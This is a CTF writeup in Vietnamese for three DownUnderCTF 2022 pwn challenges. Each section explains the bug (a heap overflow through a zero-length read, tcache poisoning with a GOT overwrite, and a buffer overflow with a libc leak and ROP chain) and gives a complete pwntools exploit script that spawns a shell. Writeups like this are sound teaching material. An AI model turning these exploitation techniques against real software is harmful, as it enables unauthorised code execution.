# Writeup DownUnderCTF 2022
###### tags: `writeup`

### login

#### Analyze 

Check sơ qua source thì cơ bản chỉ gồm 2 function chính 

* Một là `Add user`: Tạo 1 struct `user_t` gồm `uid` và `username` sau đó nhập độ dài (không được lớn hơn 0x18) và nhập username với độ dài tương ứng đã nhập ở trên. 
* Hai là `login`:  Đơn giản chỉ là nhập username vào và nó check thử xem đã có username đó hay chưa ngoài ra nó còn check nếu `uid` = 0x1337 thì nó sẽ chạy `system('/bin/sh')`. Tuy nhiên thì mỗi lần `Add user` thì `uid` sẽ tự động cộng lên một (ban đầu `uid` được set = 0x1337). 

#### Exploit

Vì struct `user_t` được khai báo như một con trỏ với typedef, vì vậy `len(user_t)` sẽ trả về 8. Có nghĩa là khi `allocate` một chunk thì chunk đó sẽ có size 0x20. Điều đó có nghĩa ta có bug overflow ở đây, bởi vì size của một chunk nó nhỏ hơn size của struct. Vậy nên ta có thể lợi dụng biến `username` để có thể ghi đè lên chunk tiếp theo, tuy nhiên vì biến `username` bị giới hạn chỉ read trong khoảng 0x18 byte vậy nó không thể ghi đè biến `uid` lên chunk tiếp theo nếu chỉ đọc trong khoảng 0x18 byte. 

Nhìn kỹ lại source thì ta phát hiện có một bug khác nằm ở hàm `read_n_delimited`. Hàm `read_n_delimited` read n-1 bytes, dừng ở biến `delimiter` và thay thế null byte vào byte cuối cùng ngay khi đọc hết byte vào buffer(để tránh off-by-one). Tuy nhiên trong hàm này không check kỹ độ dài đọc vào buffer, vậy nên ta có thể đọc bất cứ bao nhiêu byte vào buffer mà ta muốn, vòng lặp while kiểm tra điều kiện i <= n-1 với n được khai báo là unsigned int, tuy nhiên chúng ta không thể nhập một số rất lớn hay là một số âm vì nó sẽ không thỏa mãn điều kiện độ dài nhỏ hơn 0x18 nhưng mà chúng ta có thể nhập độ dài là 0 thì điều kiện sẽ luôn được thỏa mãn và chúng ta đã có thể đọc bất kỳ bao nhiêu ký tự mà chúng ta muốn. 

Bây giờ chúng ta cần phải set `uid` của một struct `user_t` = 0x1337, bài này mình sẽ write data vào top chunk và khi allocate user tiếp theo thì nó sẽ check `uid` và ta đã có được shell

```py
from pwn import * 
r = process('./login')

def reg(len,name):
    r.sendlineafter(b'> ',b'1')
    r.sendlineafter(b'Username length: ',str(len).encode())
    r.sendlineafter(b'Username: ',name)
def login(name):
    r.sendlineafter(b'> ',b'2')
    r.sendlineafter(b'Username: ',str(name))

payload = b'a'*20 + p64(0x20d31) + p64(0x1337) + b'c'
reg(0,payload)
# gdb.attach(r)
reg(2,'c')
login('c')

r.interactive()
```
### p0ison3d

Bởi vì bài này khá là đơn giản nên mình sẽ lướt sơ qua và script mình sẽ để ở bên dưới. 

Đây là một bài heap cơ bản, gồm 5 function chính:
* `add new note`: add một note đơn giản gồm index và data (read up to 128 bytes) và chỉ được add tối đa 3 note
* `read note`: in ra nội dung của một note chỉ định thông qua biến index
* `edit note`: hàm này sẽ overwrite data của một chunk tuy nhiên nó đọc tận 153 bytes vì thế ở hàm này có bug overflow 
* `delete note`: đơn giản chỉ là free một chunk và set pointer về null vậy nên không có bug uaf ở đây
* `quit` : exit(0)

#### Exploit

Bài này set `RELRO: Partial RELRO` vì thế strategy của mình đó là mình sẽ lợi dụng bug overflow ở hàm `edit` để có thể ghi đè fd của chunk 0 thành got address của hàm exit rồi sau đó alloc một chunk có data là địa chỉ của hàm win sau đó gọi hàm `quit` thì sẽ trigger đc shell.

```py
from pwn import *

elf = ELF('./p0ison3d')
r = process('./p0ison3d')
def add(index, data):
    r.sendlineafter(b'choice:\n', b'1')
    r.sendlineafter(b'index:\n', str(index))
    r.sendafter(b'data:\n', data)
def edit_note(index, data):
    r.sendlineafter(b'choice:\n', b'3')
    r.sendlineafter(b'index:\n', str(index))
    r.sendlineafter(b'data:', data)
def delete(index):
    r.sendlineafter(b'choice:\n', b'4')
    r.sendlineafter(b'index:\n', str(index))
def gg():
    r.sendlineafter(b'choice:\n', b'5')
add(0, 'aaaa') 
add(1, 'bbbb') 
add(2, 'cccc')

delete(2) # chunk 1 (currently bin)
delete(1) # chunk 2 -> chunk 1 (currently bin)
# gdb.attach(r)
edit_note(0, b'a'*0x90 + p64(elf.got['exit']))
# gdb.attach(r)
add(1,b'dddd')#call fake chunk which elf.got['exit'] lies inside
add(2,p64(elf.sym['win'])) # overwrite fd of fake chunk with win
#call exit will trigger the shell
gg()
r.interactive()
```

### Ezpz - rev - pwn

Một trong những teammate của mình đã solve được câu `Ezpz - rev` sau đó bài này đơn giản chỉ cần nhập key mới tìm được ở câu `Ezpz - rev ` sau đó lợi dụng lỗi bof để có thể leak libc sau khi có libc thì chỉ đơn giản build ROP chain gọi system('/bin/sh')

Bài này chỉ khó ở khúc reverse còn pwn thì khá là đơn giản. 

```py 

from pwn import * 


r = process('./ezpz')
elf = context.binary = ELF('./ezpz')
# libc = ELF('libc-2.35.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

solve = b'0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000'
main = 0x4014A0
ret = 0x000000000040101a
pop_rdi = 0x00000000004015d3


payload = solve +  b'a'*36 + p64(pop_rdi) + p64(elf.got['puts'])  + p64(elf.plt['puts']) + p64(main)
r.sendline(payload)
r.recvuntil(b'\n')
leak = u64(r.recv(6).ljust(8,b'\x00'))
print('puts leak: ',hex(leak))
libc.address = leak - libc.sym['puts']
log.info('libc: '+hex(libc.address))
payload_1 = solve + b'a'*36 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
r.sendline(payload_1)
r.interactive()
```

